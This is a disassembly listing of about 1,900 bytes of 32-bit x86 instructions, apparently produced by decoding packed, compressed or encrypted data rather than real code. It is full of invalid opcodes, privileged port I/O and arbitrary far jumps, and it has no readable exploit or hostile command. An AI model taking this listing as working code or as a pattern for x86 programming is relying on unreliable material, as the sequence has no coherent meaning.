  40f7d3:	call   0x7c0b:0xf382783d
  40f7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7db:	ja     0x40f828
  40f7dd:	push   eax
  40f7de:	into   
  40f7df:	scas   eax,DWORD PTR es:[edi]
  40f7e0:	push   ds
  40f7e1:	xor    eax,DWORD PTR [ebx+0x482ffbed]
  40f7e7:	or     BYTE PTR [edx+0x7],ch
  40f7ea:	xchg   esp,eax
  40f7eb:	push   ss
  40f7ec:	mov    esi,0x7647716f
  40f7f1:	cmp    eax,0xea461087
  40f7f6:	and    ebp,ecx
  40f7f8:	inc    ebx
  40f7f9:	in     al,0xc0
  40f7fb:	push   es
  40f7fc:	ins    BYTE PTR es:[edi],dx
  40f7fd:	std    
  40f7fe:	fs xor ch,dh
  40f801:	adc    eax,0xaa4f3761
  40f806:	cmp    BYTE PTR [edi+ebx*8-0x5e5cc702],0xe1
  40f80e:	push   cs
  40f80f:	idiv   ecx
  40f811:	bound  ebp,QWORD PTR ds:0xe133
  40f816:	icebp  
  40f817:	lods   al,BYTE PTR ds:[esi]
  40f818:	or     BYTE PTR [esi+0x741b4455],cl
  40f81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f81f:	add    DWORD PTR [eax-0x283cee4d],edx
  40f825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f826:	sbb    bh,BYTE PTR [edx]
  40f828:	popa   
  40f829:	jle    0x40f7d7
  40f82b:	inc    esp
  40f82c:	add    eax,0xe44a3a83
  40f831:	xchg   DWORD PTR [ebp-0x155e3a4],ebx
  40f837:	inc    eax
  40f838:	in     al,0xe0
  40f83a:	push   ecx
  40f83b:	jmp    0x76f4:0xa0c35d47
  40f842:	arpl   di,sp
  40f844:	push   ss
  40f845:	out    dx,al
  40f846:	xor    cl,BYTE PTR [edi+0x5b4744cf]
  40f84c:	adc    al,0xe9
  40f84e:	xchg   esp,eax
  40f84f:	test   DWORD PTR [ebx],edi
  40f851:	jg     0x40f850
  40f853:	test   DWORD PTR [edi],0x784c18c5
  40f859:	or     cl,dl
  40f85b:	cmp    al,0xbe
  40f85d:	or     cl,BYTE PTR [esi+0x62]
  40f860:	mov    edi,0x5f3d3cca
  40f865:	es pusha 
  40f867:	xchg   esp,eax
  40f868:	andps  xmm5,XMMWORD PTR [esi-0x2b]
  40f86c:	push   esp
  40f86d:	scas   al,BYTE PTR es:[edi]
  40f86e:	add    BYTE PTR [ebx-0x10],bl
  40f871:	lods   eax,DWORD PTR ds:[esi]
  40f872:	jg     0x40f897
  40f874:	retf   
  40f875:	mov    ebp,0x8c2aa1bb
  40f87a:	imul   edx,DWORD PTR [esp+esi*8-0x72],0x28
  40f87f:	repnz or DWORD PTR [eax-0x2e222ca4],edx
  40f886:	inc    ebp
  40f887:	dec    edx
  40f888:	js     0x40f835
  40f88a:	pop    es
  40f88b:	stos   BYTE PTR es:[edi],al
  40f88c:	push   ebx
  40f88d:	loope  0x40f82a
  40f88f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f890:	pop    ds
  40f891:	inc    edx
  40f892:	ds push edx
  40f894:	lahf   
  40f895:	or     al,ch
  40f897:	frstor [esi-0x21]
  40f89a:	dec    ebp
  40f89b:	mov    ecx,0xda17fdd5
  40f8a0:	shl    BYTE PTR [ebx-0x982f93d],cl
  40f8a6:	ficom  WORD PTR [ebx+0x1b]
  40f8a9:	in     al,0x48
  40f8ab:	pop    edi
  40f8ac:	xor    DWORD PTR [eax+0x29],ebp
  40f8af:	fsubr  DWORD PTR ds:[ebp+ebp*8+0x4c]
  40f8b4:	push   esi
  40f8b5:	and    BYTE PTR [ecx+0x6f],bl
  40f8b8:	rol    eax,0x4e
  40f8bb:	ss dec edi
  40f8bd:	and    dl,BYTE PTR [eax+0x6c]
  40f8c0:	xlat   BYTE PTR ds:[ebx]
  40f8c1:	xor    eax,0xb462233a
  40f8c6:	mov    bl,0x4a
  40f8c8:	dec    ebx
  40f8c9:	add    DWORD PTR [ecx+0x11],eax
  40f8cc:	inc    ebx
  40f8cd:	iret   
  40f8ce:	push   0x489b08f5
  40f8d3:	xor    esi,DWORD PTR [ebx-0x44]
  40f8d6:	pop    es
  40f8d7:	pop    ecx
  40f8d8:	xchg   esi,eax
  40f8d9:	push   edx
  40f8da:	adc    DWORD PTR [edx-0x58],edx
  40f8dd:	fadd   DWORD PTR [ecx-0x6807a50c]
  40f8e3:	mov    bh,0x21
  40f8e5:	pop    esp
  40f8e6:	ret    
  40f8e7:	sub    ebp,DWORD PTR gs:[eax+0x43db8868]
  40f8ee:	aad    0xed
  40f8f0:	leave  
  40f8f1:	(bad)  
  40f8f2:	fdivr  DWORD PTR [ecx+0x6a0a3e78]
  40f8f8:	or     bl,dh
  40f8fa:	lods   al,BYTE PTR ds:[esi]
  40f8fb:	loope  0x40f883
  40f8fd:	(bad)  
  40f8fe:	scas   al,BYTE PTR es:[edi]
  40f8ff:	or     eax,0x6490eb41
  40f904:	aas    
  40f905:	xlat   BYTE PTR ds:[ebx]
  40f906:	shl    BYTE PTR [edx],cl
  40f908:	xchg   edi,eax
  40f909:	shl    DWORD PTR [ecx+0xef40797],cl
  40f90f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f910:	scas   eax,DWORD PTR es:[edi]
  40f911:	inc    edi
  40f912:	and    edx,DWORD PTR [ecx]
  40f914:	fild   DWORD PTR es:[esi]
  40f917:	hlt    
  40f918:	icebp  
  40f919:	mov    esp,0xa3bec2b8
  40f91e:	aad    0xc9
  40f920:	loop   0x40f95f
  40f922:	ins    BYTE PTR es:[edi],dx
  40f923:	inc    ecx
  40f924:	push   0x103d888
  40f929:	retf   
  40f92a:	nop
  40f92b:	call   0xf02d63cc
  40f930:	dec    ebp
  40f931:	imul   esi,DWORD PTR [ecx],0xbf799917
  40f937:	sub    BYTE PTR [edx-0x7ce36027],cl
  40f93d:	pop    esp
  40f93e:	push   ecx
  40f93f:	sub    al,0xc2
  40f941:	aad    0xb6
  40f943:	call   0xd02d:0xe7ef4888
  40f94a:	mov    edi,0xe2945b0b
  40f94f:	sar    ah,0xc3
  40f952:	js     0x40f9c8
  40f954:	repz and al,0x14
  40f957:	sub    esi,DWORD PTR [eax-0x22363dee]
  40f95d:	jge    0x40f8fb
  40f95f:	xchg   edx,eax
  40f960:	jae    0x40f98d
  40f962:	or     bl,BYTE PTR [esi-0x35]
  40f965:	xchg   ebx,eax
  40f966:	rcl    BYTE PTR [edi],1
  40f968:	in     al,0x81
  40f96a:	mov    DWORD PTR [ecx-0x26686d01],ebx
  40f970:	xor    BYTE PTR [eax+eiz*1],ch
  40f973:	or     al,0xcc
  40f975:	pushf  
  40f976:	push   0x3b41265f
  40f97b:	adc    eax,0xedc27bfb
  40f980:	jno    0x40f941
  40f982:	data16 aad 0xdb
  40f985:	scas   eax,DWORD PTR es:[edi]
  40f986:	xchg   edi,eax
  40f987:	jl     0x40f91a
  40f989:	inc    edx
  40f98a:	mov    ?,WORD PTR [edi+0x5457e93]
  40f990:	jp     0x40f9f1
  40f992:	sbb    DWORD PTR [edi-0x62acbeb4],0xffffffc7
  40f999:	mov    dh,BYTE PTR [edi+0x33f562ca]
  40f99f:	inc    ecx
  40f9a0:	mov    ebx,esi
  40f9a2:	fnstenv [esi+0x7b]
  40f9a5:	add    BYTE PTR [ecx-0x20],bh
  40f9a8:	cmp    bh,bl
  40f9aa:	push   es
  40f9ab:	ret    
  40f9ac:	inc    eax
  40f9ad:	mov    dh,0xfe
  40f9af:	push   es
  40f9b0:	lahf   
  40f9b1:	ret    
  40f9b2:	call   0x56b5d66d
  40f9b7:	int3   
  40f9b8:	loope  0x40f98e
  40f9ba:	mov    edx,0x7ea2d5ab
  40f9bf:	cmp    eax,0x9849fbd1
  40f9c4:	adc    al,0xb5
  40f9c6:	fs pop edx
  40f9c8:	sub    esi,DWORD PTR [edx]
  40f9ca:	jg     0x40f97f
  40f9cc:	cwde   
  40f9cd:	std    
  40f9ce:	push   0xfffffffe
  40f9d0:	hlt    
  40f9d1:	xchg   ecx,eax
  40f9d2:	rol    DWORD PTR [eax-0x608d8ccb],cl
  40f9d8:	sbb    bl,ah
  40f9da:	addr16 ret 0x269b
  40f9de:	pop    ebx
  40f9df:	xchg   edx,eax
  40f9e0:	ins    DWORD PTR es:[edi],dx
  40f9e1:	mov    ds:0xe94e6f1f,al
  40f9e6:	sti    
  40f9e7:	inc    ebx
  40f9e8:	or     esp,0xa4edc68e
  40f9ee:	imul   esp,DWORD PTR ss:[edi-0x60],0x54515f27
  40f9f6:	es leave 
  40f9f8:	pop    esi
  40f9f9:	scas   al,BYTE PTR es:[edi]
  40f9fa:	jmp    0x40f9ec
  40f9fc:	mov    fs,WORD PTR [ebx+0x51]
  40f9ff:	imul   DWORD PTR [esi-0x77d4b42]
  40fa05:	int3   
  40fa06:	mov    ebx,0xea5cbcec
  40fa0b:	xchg   edi,eax
  40fa0c:	cmp    BYTE PTR [edx-0x315887f9],cl
  40fa12:	bound  edx,QWORD PTR [ecx-0x5]
  40fa15:	or     edx,ebx
  40fa17:	popf   
  40fa18:	(bad)  
  40fa19:	jl     0x40f9ef
  40fa1b:	(bad)  
  40fa1c:	out    0x90,al
  40fa1e:	aas    
  40fa1f:	mov    ds:0xe1db9724,eax
  40fa24:	shr    BYTE PTR [eax],cl
  40fa26:	in     al,dx
  40fa27:	or     al,dl
  40fa29:	ja     0x40f9ef
  40fa2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa2c:	inc    ebp
  40fa2d:	pop    edx
  40fa2e:	in     eax,0xd3
  40fa30:	arpl   WORD PTR [ebp+0x9ae2e8c],dx
  40fa36:	int3   
  40fa37:	sbb    BYTE PTR [edx-0x14ee7f64],0x35
  40fa3e:	es jnp 0x40fa4e
  40fa41:	jae    0x40fa53
  40fa43:	cdq    
  40fa44:	pop    ebp
  40fa45:	int    0xf0
  40fa47:	hlt    
  40fa48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa49:	xchg   esp,eax
  40fa4a:	cmc    
  40fa4b:	push   ss
  40fa4c:	jmp    FWORD PTR [edi+edx*4-0x4f]
  40fa50:	xchg   ebx,eax
  40fa51:	and    bl,dh
  40fa53:	and    DWORD PTR [ecx-0x52a592c4],0x49
  40fa5a:	int3   
  40fa5b:	xchg   DWORD PTR [eax+edx*1-0x39df8bfa],esi
  40fa62:	cmp    esi,ebx
  40fa64:	pop    eax
  40fa65:	pop    ecx
  40fa66:	inc    esi
  40fa67:	pop    ds
  40fa68:	cmp    bh,bh
  40fa6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa6b:	fadd   QWORD PTR [eax-0x52]
  40fa6e:	adc    cl,BYTE PTR [edi]
  40fa70:	cdq    
  40fa71:	outs   dx,BYTE PTR ds:[esi]
  40fa72:	mov    bh,0x80
  40fa74:	xchg   esp,eax
  40fa75:	pop    es
  40fa76:	mov    ebx,0x99905332
  40fa7b:	jl     0x40fadf
  40fa7d:	dec    bl
  40fa7f:	lea    edi,ds:0x36bdabf8
  40fa85:	mov    eax,0xf6e96874
  40fa8a:	or     ecx,DWORD PTR ds:0x6152f48
  40fa90:	dec    ebp
  40fa91:	int3   
  40fa92:	mov    cl,0x35
  40fa94:	leave  
  40fa95:	test   al,0x35
  40fa97:	push   edi
  40fa98:	push   0x68
  40fa9a:	ins    DWORD PTR es:[edi],dx
  40fa9b:	dec    edi
  40fa9c:	and    DWORD PTR [ecx-0x2f3399dd],0x40
  40faa3:	cmp    eax,0x58463776
  40faa8:	imul   esi,DWORD PTR [ebx-0x1f],0xffffff8e
  40faac:	jne    0x40fb09
  40faae:	popa   
  40faaf:	pop    esi
  40fab0:	(bad)  
  40fab1:	ss xor al,0x4c
  40fab4:	scas   eax,DWORD PTR es:[edi]
  40fab5:	or     dl,dl
  40fab7:	pop    es
  40fab8:	rol    DWORD PTR [ebx-0x11],0xae
  40fabc:	xor    ebp,esp
  40fabe:	out    dx,al
  40fabf:	sti    
  40fac0:	adc    BYTE PTR [ebx+0x7f],ah
  40fac3:	adc    BYTE PTR [edx+0xf],bl
  40fac6:	push   ss
  40fac7:	lods   al,BYTE PTR ds:[esi]
  40fac8:	stc    
  40fac9:	fbld   TBYTE PTR [esi+0xae4d934]
  40facf:	sub    edx,ecx
  40fad1:	inc    esi
  40fad2:	mov    eax,0x2e3aedb1
  40fad7:	jg     0x40fa75
  40fad9:	popf   
  40fada:	adc    ch,BYTE PTR ds:0x53c85cf1
  40fae0:	aad    0x4d
  40fae2:	add    al,0x25
  40fae4:	jae    0x40fae3
  40fae6:	aad    0x4a
  40fae8:	mov    al,0x31
  40faea:	push   eax
  40faeb:	cmp    al,0x47
  40faed:	jp     0x40fab5
  40faef:	jo     0x40fa86
  40faf1:	outs   dx,DWORD PTR ds:[esi]
  40faf2:	std    
  40faf3:	xlat   BYTE PTR ds:[ebx]
  40faf4:	xchg   ebx,eax
  40faf5:	ss pop edi
  40faf7:	inc    edi
  40faf8:	popf   
  40faf9:	cmp    ebp,ecx
  40fafb:	jecxz  0x40fa92
  40fafd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fafe:	jecxz  0x40fb73
  40fb00:	outs   dx,DWORD PTR ds:[esi]
  40fb01:	adc    al,0x6f
  40fb03:	(bad)  
  40fb04:	fidiv  DWORD PTR [edi+eiz*4+0x0]
  40fb08:	ja     0x40fb85
  40fb0a:	dec    edi
  40fb0b:	jmp    0xf637a60f
  40fb10:	jmp    0x40fb38
  40fb12:	fld    DWORD PTR [edx+ecx*1+0x5abce53d]
  40fb19:	out    0x5a,al
  40fb1b:	and    DWORD PTR [ebx+0x348c458e],ecx
  40fb21:	xor    DWORD PTR [edx-0xc],esi
  40fb24:	jno    0x40fba5
  40fb26:	inc    eax
  40fb27:	(bad)  
  40fb28:	int    0xb1
  40fb2a:	inc    edx
  40fb2b:	add    BYTE PTR [esp+esi*8-0x37801e2b],0x1
  40fb33:	mov    esi,0x30be52ed
  40fb38:	jl     0x40fbb7
  40fb3a:	cmp    ah,BYTE PTR [edx+edx*4+0x52]
  40fb3e:	pop    es
  40fb3f:	lock shl BYTE PTR [ecx],cl
  40fb42:	mov    al,0x44
  40fb44:	cmp    al,0xf8
  40fb46:	iret   
  40fb47:	fdivr  QWORD PTR [esi-0x54b9fd14]
  40fb4d:	jae    0x40fb0e
  40fb4f:	inc    esp
  40fb50:	repnz and al,0x69
  40fb53:	mov    bl,ch
  40fb55:	cmp    BYTE PTR [edx],bh
  40fb57:	pushf  
  40fb58:	ja     0x40fb48
  40fb5a:	dec    edx
  40fb5b:	mov    ebx,0xad6c0f46
  40fb60:	mov    al,ds:0x304b659d
  40fb65:	jmp    0xc1d4f8fd
  40fb6a:	jp     0x40fb86
  40fb6c:	xor    BYTE PTR [ecx+0x12],ah
  40fb6f:	mov    eax,ds:0xee76470f
  40fb74:	inc    ecx
  40fb75:	pop    ss
  40fb76:	fbld   TBYTE PTR [edx]
  40fb78:	add    eax,DWORD PTR ds:0x53a329f3
  40fb7e:	aad    0xfd
  40fb80:	sub    cl,BYTE PTR [ebx]
  40fb82:	jg     0x40fb0b
  40fb84:	cdq    
  40fb85:	popa   
  40fb86:	call   0x7362:0x3192f357
  40fb8d:	sub    DWORD PTR [edi+0x3a7c4f74],ecx
  40fb93:	xor    dh,BYTE PTR [edi-0x3383c7a]
  40fb99:	and    edx,DWORD PTR [esi+0x6613a2bc]
  40fb9f:	push   edi
  40fba0:	addr16 jmp 0x5a6e:0xc0b8819b
  40fba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fba9:	fiadd  WORD PTR [ebp-0x4c]
  40fbac:	mov    ecx,gs
  40fbae:	aaa    
  40fbaf:	ds dec esi
  40fbb1:	dec    DWORD PTR [edi-0x14]
  40fbb4:	jbe    0x40fb95
  40fbb6:	mov    bh,BYTE PTR [eax-0x61]
  40fbb9:	xchg   edx,eax
  40fbba:	fld    TBYTE PTR [ebx-0x4c09624a]
  40fbc0:	xchg   ecx,eax
  40fbc1:	cmp    eax,0xe64d81e8
  40fbc6:	jbe    0x40fbae
  40fbc8:	je     0x40fb75
  40fbca:	xor    eax,0x87907997
  40fbcf:	dec    esp
  40fbd0:	push   ds
  40fbd1:	add    DWORD PTR [edi+eax*8+0x61bc8bc2],0xdf0b163a
  40fbdc:	cmp    edx,DWORD PTR [edx-0x4e]
  40fbdf:	jns    0x40fc43
  40fbe1:	sub    dh,ah
  40fbe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbe4:	jae    0x40fbb8
  40fbe6:	nop
  40fbe7:	mov    eax,0x43ce0240
  40fbec:	(bad)  
  40fbed:	icebp  
  40fbee:	call   0xa67d:0x4dbd9620
  40fbf5:	in     eax,0xf4
  40fbf7:	loope  0x40fbe7
  40fbf9:	adc    DWORD PTR [edi+0x43],esi
  40fbfc:	pop    ecx
  40fbfd:	out    0xaa,eax
  40fbff:	dec    edx
  40fc00:	adc    BYTE PTR [ecx],al
  40fc02:	jg     0x40fb93
  40fc04:	jae    0x40fbad
  40fc06:	jo     0x40fbd3
  40fc08:	fwait
  40fc09:	das    
  40fc0a:	mov    dl,0xb2
  40fc0c:	and    ax,cx
  40fc0f:	test   BYTE PTR [edi-0x8970543],al
  40fc15:	sti    
  40fc16:	add    esi,ecx
  40fc18:	mov    ds,esp
  40fc1a:	lods   al,BYTE PTR ds:[esi]
  40fc1b:	push   ecx
  40fc1c:	mov    ah,0xfe
  40fc1e:	ror    BYTE PTR [ebp-0x3],0x9c
  40fc22:	inc    esp
  40fc23:	pop    ss
  40fc24:	fwait
  40fc25:	xchg   BYTE PTR [ecx],bh
  40fc27:	sub    eax,0x18b81a86
  40fc2c:	add    ebx,edx
  40fc2e:	pop    ebp
  40fc2f:	(bad)  
  40fc30:	in     eax,dx
  40fc31:	out    dx,al
  40fc32:	mov    cl,0x9d
  40fc34:	cli    
  40fc35:	pop    edx
  40fc36:	sahf   
  40fc37:	add    DWORD PTR [eax-0x5b],0x80da6ed0
  40fc3e:	pop    edi
  40fc3f:	dec    ebx
  40fc40:	or     bh,bl
  40fc42:	pop    edx
  40fc43:	addr16 xchg ebp,eax
  40fc45:	ins    BYTE PTR es:[edi],dx
  40fc46:	sar    edx,0x5c
  40fc49:	mov    fs,eax
  40fc4b:	or     cl,al
  40fc4d:	or     edx,DWORD PTR [eax-0x6f]
  40fc50:	stc    
  40fc51:	xchg   esp,eax
  40fc52:	jecxz  0x40fc0a
  40fc54:	fcom   QWORD PTR fs:[edi]
  40fc57:	hlt    
  40fc58:	(bad)  
  40fc5a:	or     ecx,edi
  40fc5c:	fstp   QWORD PTR [eax]
  40fc5e:	xchg   edx,eax
  40fc5f:	and    BYTE PTR [ecx-0x672602ed],dh
  40fc65:	mov    esp,0x859815d8
  40fc6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc6b:	retf   0x2026
  40fc6e:	sbb    eax,0x6e03b78
  40fc73:	mov    bh,0x18
  40fc75:	mov    esp,0xfdad99e1
  40fc7a:	(bad)  
  40fc7b:	xor    eax,0x8b564f82
  40fc80:	dec    edx
  40fc81:	cmp    al,BYTE PTR [edx-0x6becdd8]
  40fc87:	sahf   
  40fc88:	adc    al,0xb8
  40fc8a:	jmp    FWORD PTR [ebx]
  40fc8c:	xchg   esi,eax
  40fc8d:	(bad)  
  40fc8e:	aas    
  40fc8f:	ss mov esi,gs
  40fc92:	mov    al,0x8
  40fc94:	or     eax,0xc5b9d381
  40fc99:	popf   
  40fc9a:	arpl   WORD PTR [ebp-0x17bb45b4],bp
  40fca0:	mov    ebp,0x26ac68
  40fca5:	xchg   esp,eax
  40fca6:	push   edx
  40fca7:	mov    ecx,0xedd2cf30
  40fcac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcad:	(bad)  
  40fcae:	in     al,0xaa
  40fcb0:	arpl   WORD PTR [ebp-0x1c],bx
  40fcb3:	mov    eax,DWORD PTR [edx+edx*8-0x2e9126f8]
  40fcba:	add    DWORD PTR [ebp-0x15],esp
  40fcbd:	mov    ebp,0x93c6299a
  40fcc2:	dec    ebx
  40fcc3:	test   BYTE PTR [esi+0x39],0x81
  40fcc7:	(bad)  
  40fcc8:	cmp    al,0x7b
  40fcca:	jl     0x40fd19
  40fccc:	mov    gs,WORD PTR [ebx-0x30]
  40fccf:	ds adc eax,0x70f15136
  40fcd5:	sbb    edi,ecx
  40fcd7:	push   edx
  40fcd8:	sbb    al,0x8
  40fcda:	cli    
  40fcdb:	jmp    0x7d2ae98
  40fce0:	adc    eax,0xb145825d
  40fce5:	int    0xbe
  40fce7:	xchg   DWORD PTR [eax+0x50],ebp
  40fcea:	push   ebp
  40fceb:	push   ds
  40fcec:	das    
  40fced:	push   esp
  40fcee:	gs push edi
  40fcf1:	sahf   
  40fcf2:	mov    al,0x8b
  40fcf4:	or     ah,dh
  40fcf6:	(bad)  
  40fcf7:	push   cs
  40fcf8:	jnp    0x40fcbc
  40fcfa:	inc    edi
  40fcfb:	xchg   edx,eax
  40fcfc:	mov    ebx,0x214f659f
  40fd01:	and    al,BYTE PTR [eax+0x48]
  40fd04:	adc    DWORD PTR [ebx-0x56ec12d9],0xffffffa4
  40fd0b:	in     eax,0x54
  40fd0d:	scas   eax,DWORD PTR es:[edi]
  40fd0e:	ret    
  40fd0f:	into   
  40fd10:	cmp    BYTE PTR [edi+eiz*8-0x7],bl
  40fd14:	gs inc ecx
  40fd16:	or     eax,0xb062760c
  40fd1b:	shl    bh,0x4d
  40fd1e:	jae    0x40fd28
  40fd20:	mov    edx,0xd76466b5
  40fd25:	mov    dh,0xd8
  40fd27:	or     BYTE PTR [edi],bl
  40fd29:	adc    al,0xb2
  40fd2b:	(bad)  
  40fd2c:	sbb    DWORD PTR [ebx-0x4aa5cb24],edi
  40fd32:	pop    edx
  40fd33:	sub    dl,dl
  40fd35:	rcr    BYTE PTR [esi-0x12aa1e5b],1
  40fd3b:	rcr    BYTE PTR [ebp+0x7fbb7b35],1
  40fd41:	xchg   edi,eax
  40fd42:	and    edi,edi
  40fd44:	inc    ebp
  40fd45:	in     al,0x83
  40fd47:	sbb    ch,BYTE PTR [esi+eax*2]
  40fd4a:	mov    cl,0x52
  40fd4c:	push   cs
  40fd4d:	and    BYTE PTR [ebx-0x3b0b3ba],dl
  40fd53:	ins    BYTE PTR es:[edi],dx
  40fd54:	out    0x77,al
  40fd56:	ror    DWORD PTR [esi],1
  40fd58:	xchg   ah,cl
  40fd5a:	ins    BYTE PTR es:[edi],dx
  40fd5b:	xor    eax,0x76d3c4c6
  40fd60:	retf   
  40fd61:	jnp    0x40fce9
  40fd63:	loopne 0x40fd7c
  40fd65:	(bad)  
  40fd68:	jecxz  0x40fd91
  40fd6a:	dec    esi
  40fd6b:	jb     0x40fda0
  40fd6d:	fisttp QWORD PTR [ebx]
  40fd6f:	push   eax
  40fd70:	cli    
  40fd71:	(bad)  
  40fd72:	cli    
  40fd73:	popa   
  40fd74:	jmp    0x40fd56
  40fd76:	stos   DWORD PTR es:[edi],eax
  40fd77:	imul   esp,DWORD PTR [ebp*2+0x3f5e6130],0xffffffd3
  40fd7f:	fimul  WORD PTR [edx-0x20623d7b]
  40fd85:	mov    ?,WORD PTR [edi+0x53fd9608]
  40fd8b:	adc    DWORD PTR [edi+0x2d4ac6a9],edi
  40fd91:	mov    bl,0x9a
  40fd93:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd95:	jbe    0x40fd7f
  40fd97:	cmp    ecx,DWORD PTR [eax-0x6d]
  40fd9a:	cmp    bl,BYTE PTR [eax]
  40fd9c:	mov    ebp,0x702aec3a
  40fda1:	scas   eax,DWORD PTR es:[edi]
  40fda2:	bound  ecx,QWORD PTR [ecx+0x5bfe7674]
  40fda8:	adc    BYTE PTR [edi-0x5b0e21d2],bl
  40fdae:	inc    edx
  40fdaf:	stos   DWORD PTR es:[edi],eax
  40fdb0:	imul   edi,DWORD PTR [ecx+0x2c],0x1644ee
  40fdb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdb8:	mov    ?,WORD PTR [ecx]
  40fdba:	dec    esi
  40fdbb:	mov    dh,0x7b
  40fdbd:	cmc    
  40fdbe:	or     BYTE PTR [esi],ah
  40fdc0:	xor    DWORD PTR [edi-0x234478cd],edi
  40fdc6:	mov    esp,0x24b66a19
  40fdcb:	sti    
  40fdcc:	xchg   DWORD PTR [edi+0x35],ebx
  40fdcf:	xchg   ebp,eax
  40fdd0:	jmp    0xf4ca:0xed765136
  40fdd7:	add    DWORD PTR [eax+edx*1+0x27],edi
  40fddb:	in     al,0x86
  40fddd:	adc    eax,0x5ceb1ac8
  40fde2:	add    eax,0x85254955
  40fde7:	fild   WORD PTR [edx-0x5b]
  40fdea:	mov    ds:0x98c4eac3,eax
  40fdef:	cli    
  40fdf0:	jecxz  0x40fdad
  40fdf2:	push   ebx
  40fdf3:	push   ebx
  40fdf4:	sub    esi,DWORD PTR [esi]
  40fdf6:	enter  0x3a2f,0xd3
  40fdfa:	or     BYTE PTR [ebx-0x7a744973],cl
  40fe00:	inc    ebp
  40fe01:	dec    edi
  40fe02:	sub    eax,0xb6d7c729
  40fe07:	mov    ebp,0xedd6fd6d
  40fe0c:	addr16 inc esp
  40fe0e:	data16 jle 0x40fe76
  40fe11:	test   eax,0xbd237545
  40fe16:	cmovae ecx,DWORD PTR [ecx-0x37]
  40fe1a:	adc    al,0x89
  40fe1c:	imul   ebx,DWORD PTR [eax+0x6dc7f809],0xfffffffd
  40fe23:	jo     0x40fdd4
  40fe25:	call   0xd2719946
  40fe2a:	gs pushw 0xfff0
  40fe2e:	aas    
  40fe2f:	imul   edi,DWORD PTR [ebx+0x1e],0x6ffe4131
  40fe36:	jmp    0x40fe2a
  40fe38:	xor    eax,DWORD PTR [ecx-0x7f1967c1]
  40fe3e:	adc    bl,BYTE PTR [ebp-0x27]
  40fe41:	lock call 0xae24:0x10b1fdcd
  40fe49:	xor    bh,BYTE PTR [ebx+edi*2+0x1e]
  40fe4d:	mov    cl,0xc
  40fe4f:	push   esp
  40fe50:	clc    
  40fe51:	in     al,dx
  40fe52:	cmp    DWORD PTR [edi],edi
  40fe54:	or     eax,0xc6a4474f
  40fe59:	mul    BYTE PTR [edx+0x7971c6c3]
  40fe5f:	cmc    
  40fe60:	fist   DWORD PTR [ebx+0x0]
  40fe63:	lahf   
  40fe64:	sub    DWORD PTR [edi+0x49],esi
  40fe67:	xchg   ecx,eax
  40fe68:	pop    ecx
  40fe69:	int3   
  40fe6a:	mov    edi,0x8eb579a6
  40fe6f:	scas   al,BYTE PTR es:[edi]
  40fe70:	xlat   BYTE PTR ds:[ebx]
  40fe71:	add    ch,BYTE PTR [ebx]
  40fe73:	popa   
  40fe74:	push   edi
  40fe75:	mov    ds,WORD PTR [esi]
  40fe77:	pop    ss
  40fe78:	jmp    0xc2e2:0xa1f7d552
  40fe7f:	cmp    bl,BYTE PTR [ebx+0x52]
  40fe82:	fwait
  40fe83:	dec    edi
  40fe84:	cmp    edi,ebp
  40fe86:	lahf   
  40fe87:	jns    0x40fe6e
  40fe89:	cmp    al,0xc7
  40fe8b:	dec    eax
  40fe8d:	test   DWORD PTR [esi+0x59],esp
  40fe90:	and    ebx,DWORD PTR [edi+0x15]
  40fe93:	rol    DWORD PTR [ecx],0x58
  40fe96:	shl    DWORD PTR [ebp+0x3e],cl
  40fe99:	bound  eax,QWORD PTR [edx-0x9fc7fa7]
  40fe9f:	out    dx,al
  40fea0:	push   esp
  40fea1:	cpuid  
  40fea3:	or     al,0x57
  40fea5:	test   eax,0x2b28f731
  40feaa:	cmp    ch,BYTE PTR [ebp-0xbae8972]
  40feb0:	adc    ah,ch
  40feb2:	out    0x6f,al
  40feb4:	ja     0x40ff24
  40feb6:	mov    ds:0xc5d8f332,eax
  40febb:	sub    DWORD PTR [esi],ecx
  40febd:	pop    ebp
  40febe:	push   ebx
  40febf:	sbb    eax,0x46d9e1a3
  40fec4:	xchg   ebp,eax
  40fec5:	jbe    0x40fe72
  40fec7:	loop   0x40ff48
  40fec9:	dec    esp
  40feca:	imul   edi,edi,0x358b7521
  40fed0:	xor    al,0xed
  40fed2:	xor    DWORD PTR [ecx-0x558ba7a2],ebx
  40fed8:	fistp  QWORD PTR [ebx-0x26]
  40fedb:	mov    ebx,0x5709159a
  40fee0:	and    BYTE PTR [ebp+ebx*1+0x21],bh
  40fee4:	add    bh,0xc9
  40fee7:	xor    eax,0x10f1f8de
  40feec:	enter  0xce5f,0xdd
  40fef0:	out    dx,eax
  40fef1:	repnz or DWORD PTR [edx],esp
  40fef4:	pusha  
  40fef5:	mov    ch,0x72
  40fef7:	fdiv   QWORD PTR [eax+0x10509ae0]
  40fefd:	add    ebp,edx
  40feff:	xchg   ebx,eax
  40ff00:	rol    al,1
  40ff02:	xchg   DWORD PTR [ecx],ebx
  40ff04:	ja     0x40fed0
  40ff06:	test   al,0xb1
  40ff08:	lea    ebp,[eax]
  40ff0a:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40ff0c:	jae    0x40ff4a
  40ff0e:	idiv   DWORD PTR [ebp-0x8]
  40ff11:	scas   al,BYTE PTR es:[edi]
  40ff12:	xor    ecx,edx
  40ff14:	test   DWORD PTR [ebp+0x7f],0x2ffc98e1
  40ff1b:	adc    edi,DWORD PTR [ecx]
  40ff1d:	or     esp,esi
  40ff1f:	repz xchg ecx,eax
  40ff21:	jmp    0x40ff3b
  40ff23:	sub    DWORD PTR ds:0x8c362336,esi
  40ff29:	leave  
